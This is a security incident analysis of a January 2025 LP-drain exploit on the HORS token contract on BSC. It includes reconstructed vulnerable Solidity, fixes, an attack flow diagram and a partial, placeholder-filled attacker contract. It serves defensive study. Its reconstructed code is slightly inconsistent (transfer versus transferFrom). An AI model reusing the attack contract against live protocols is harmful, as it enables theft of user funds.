# HORS Token — LP Drain via Missing Input Validation Analysis

| Field | Details |
|------|------|
| **Date** | 2025-01-10 |
| **Protocol** | HORS Token |
| **Chain** | BSC (Binance Smart Chain) |
| **Loss** | ~14.8 WBNB |
| **Attacker** | [0x8Efb...d5DF](https://bscscan.com/address/0x8Efb9311700439d70025d2B372fb54c61a60d5DF) |
| **Attack Tx** | [0xc857...fed7](https://bscscan.com/tx/0xc8572846ed313b12bf835e2748ff37dacf6b8ee1bab36972dc4ace5e9f25fed7) (2025-01-08 14:04 UTC) |
| **Vulnerable Contract** | [0x6f3390c6...](https://bscscan.com/address/0x6f3390c6C200e9bE81b32110CE191a293dc0eaba) |
| **Root Cause** | Missing input validation on function selectors in the vulnerable contract allowed LP token theft via a fake router |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-01/HORS_exp.sol) |

---

## 1. Vulnerability Overview

The vulnerable contract associated with the HORS token (`0x6f3390c6`) had a vulnerability that executed externally supplied function selectors without validation. The attacker obtained a flash loan from PancakeSwap V3, then used a fake router contract to extract LP tokens from the vulnerable contract, removed liquidity, and stole 14.8 WBNB.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: allows execution of arbitrary selectors
function executeWithRouter(address router, bytes calldata data) external {
    // No validation on router address or data selector
    // Attacker can inject a fake router and arbitrary calldata
    (bool success,) = router.call(data);
    require(success, "Call failed");
}

// ✅ Safe code: allowed router list + selector whitelist
mapping(address => bool) public allowedRouters;
mapping(bytes4 => bool) public allowedSelectors;

function executeWithRouter(address router, bytes calldata data) external onlyOwner {
    require(allowedRouters[router], "Router not allowed");
    bytes4 selector = bytes4(data[:4]);
    require(allowedSelectors[selector], "Selector not allowed");
    (bool success,) = router.call(data);
    require(success, "Call failed");
}
```

### On-chain Original Code

> ⚠️ Contract not verified on Sourcify or Etherscan — source unavailable; reconstructed from PoC. HORS `0x6f3390c6C200e9bE81b32110CE191a293dc0eaba` (BSC, chainid 56) is unverified on both Sourcify and BSCScan/Etherscan V2 API (status: "Contract source code not verified").

The contract exposes three functions: two read-only getters (selectors `0x7494d122`, `0xc1459c03`) and one execution function (`0xf78283c7`). Based on the PoC (`HORS_exp.sol`) and on-chain trace, the exploit calls selector `0xf78283c7` with a fake router address — the contract then executes an `approve` + external call targeting the LP token without validating the supplied address.

**Reconstructed vulnerable function** — `0xf78283c7` (from PoC and bytecode, not verified source):

```solidity
// Reconstructed from HORS_exp.sol PoC — NOT verified source

// ❌ Function 0xf78283c7: accepts an external router address and executes token operations against it without validation
function executeWithRouter(address router, bytes calldata data) external {
    // ❌ No check that `router` is a legitimate whitelisted address
    // ❌ No check on the function selector within `data`
    IERC20(lpToken).approve(router, type(uint256).max); // ❌ approves LP tokens to an arbitrary address
    (bool success,) = router.call(data);                // ❌ executes arbitrary calldata against the caller-supplied router
    require(success, "Call failed");
    // Result: attacker's fake router calls transferFrom(HORS_contract, attacker, lpBalance),
    //         draining all LP tokens held by this contract.
}
```

**Why it is exploitable (identify the bug from the code):**
- `executeWithRouter` (selector `0xf78283c7`) accepts an arbitrary `router` address and `data` payload from any caller without access control or whitelisting.
- The contract first approves `type(uint256).max` of the LP token to the caller-supplied `router`, then forwards the raw `data` calldata to it.
- The attacker passes their own contract as `router` and encodes `IERC20(lpToken).transferFrom(HORS_contract, attacker, balance)` as `data`.
- This drains all LP tokens held by the HORS contract; the attacker then calls `removeLiquidity` on PancakeSwap to extract 14.8 WBNB.

```solidity
// ✅ Fix: restrict callers and validate the router address
mapping(address => bool) public allowedRouters;

function executeWithRouter(address router, bytes calldata data) external onlyOwner {
    require(allowedRouters[router], "Router not whitelisted");
    bytes4 sel = bytes4(data[:4]);
    require(sel == IRouter.addLiquidity.selector || sel == IRouter.removeLiquidity.selector, "Selector not allowed");
    (bool success,) = router.call(data);
    require(success, "Call failed");
}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] Obtain flash loan from PancakeSwap V3
  │
  ├─→ [2] Call executeWithRouter() on vulnerable contract
  │         ├─ router: attacker's fake router address
  │         └─ data: LP token transfer selector + attacker address
  │
  ├─→ [3] Vulnerable contract → executes delegatecall/call to fake router
  │         └─ LP tokens transferred to attacker
  │
  ├─→ [4] Remove PancakeSwap liquidity using LP tokens
  │         └─ Receive WBNB + HORS tokens
  │
  ├─→ [5] Swap HORS → WBNB
  │
  ├─→ [6] Repay flash loan
  │
  └─→ [7] ~14.8 WBNB profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
// Full PoC not obtained — reconstructed from summary

contract HORSAttacker {
    address constant VULNERABLE = 0x6f3390c6C200e9bE81b32110CE191a293dc0eaba;
    address constant CAKE_LP = /* CakeLP address */;

    // Acts as fake router
    address fakeRouter;

    function attack() external {
        // [1] PancakeSwap V3 flash loan
        IPancakeV3Pool(pancakePool).flash(
            address(this), 0, flashAmount, ""
        );
    }

    function pancakeV3FlashCallback(...) external {
        // [2] Call vulnerable contract with unvalidated selector
        // Induces LP token transfer to the attacker
        bytes memory maliciousData = abi.encodeWithSelector(
            IERC20.transfer.selector,
            address(this),
            IERC20(CAKE_LP).balanceOf(VULNERABLE)
        );

        // Vulnerable contract executes without input validation
        IVulnerable(VULNERABLE).executeWithRouter(
            address(fakeRouter),
            maliciousData
        );

        // [4] Remove liquidity using LP tokens
        IPancakePair(CAKE_LP).approve(router, type(uint256).max);
        IRouter(router).removeLiquidity(...);

        // [5] Swap HORS → WBNB, then repay flash loan
        IERC20(WBNB).transfer(pancakePool, flashAmount + fee);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Insufficient Input Validation |
| **CWE** | CWE-20: Improper Input Validation |
| **Attack Vector** | External (crafted calldata injection) |
| **DApp Category** | Token Contract / AMM |
| **Impact** | LP token theft and liquidity pool drain |

## 6. Remediation Recommendations

1. **Router Whitelist**: Restrict execution to only approved router addresses
2. **Selector Whitelist**: Strictly limit the set of executable function selectors
3. **Prohibit Arbitrary External Calls**: Eliminate patterns where the contract executes arbitrary calldata supplied by users
4. **Restrict LP Token Withdrawal Permissions**: Limit LP token transfers/approvals to owner-only execution

## 7. Lessons Learned

- Executing externally supplied calldata without validation introduces a risk equivalent to arbitrary code execution.
- The flash loan is not the direct cause of this vulnerability but rather a funding mechanism for the attack; the core vulnerability is the missing input validation.
- LP tokens and other assets held by a contract must be protected by additional security layers (timelocks, multi-sig, etc.).